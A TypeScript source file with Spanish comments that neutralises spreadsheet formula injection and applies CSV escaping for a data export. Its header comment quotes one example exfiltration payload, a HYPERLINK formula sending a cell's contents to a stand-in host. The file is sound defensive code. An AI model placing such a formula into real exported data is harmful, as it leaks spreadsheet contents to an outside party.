/**
 * Escapado de valores para el CSV de exportacion.
 *
 * Dos problemas distintos, que se resuelven en este orden:
 *
 * 1. Inyeccion de formulas. Excel, LibreOffice y Sheets interpretan como
 *    formula cualquier celda que empiece con = + - @ (y con tab o CR, que
 *    algunos parsers recortan antes de mirar el primer caracter). El contenido
 *    del CSV lo escriben los choferes: alguien que ponga
 *    =HYPERLINK("http://malo/?d="&A1) en las observaciones de un traslado logra
 *    que eso se ejecute cuando el admin abre el respaldo. No es teorico: es la
 *    via clasica para exfiltrar una planilla entera.
 *
 * 2. Escapado de CSV propiamente dicho, para separadores, comillas y saltos de
 *    linea.
 */

/** Caracteres que vuelven formula a una celda al aparecer al principio. */
const PREFIJOS_PELIGROSOS = ['=', '+', '-', '@', '\t', '\r']

/**
 * Neutraliza una formula anteponiendo una comilla simple, que es lo que la
 * planilla usa para marcar "esto es texto". Se aplica antes del escapado.
 */
export function neutralizarFormula(texto: string): string {
  if (texto.length === 0) return texto
  return PREFIJOS_PELIGROSOS.includes(texto[0]!) ? `'${texto}` : texto
}

/**
 * Prepara un valor para una celda: neutraliza formulas y escapa segun CSV.
 * El separador es punto y coma, que es lo que espera Excel en es-AR.
 */
export function escapeCsvValue(value: string | number | null | undefined): string {
  if (value === null || value === undefined) return ''

  // Los numeros salen de columnas numericas, no de texto del usuario: no
  // pueden ser una formula y anteponerles una comilla romperia las sumas.
  if (typeof value === 'number') return String(value)

  const texto = neutralizarFormula(value)

  if (/[;"\r\n]/.test(texto)) {
    return `"${texto.replace(/"/g, '""')}"`
  }
  return texto
}
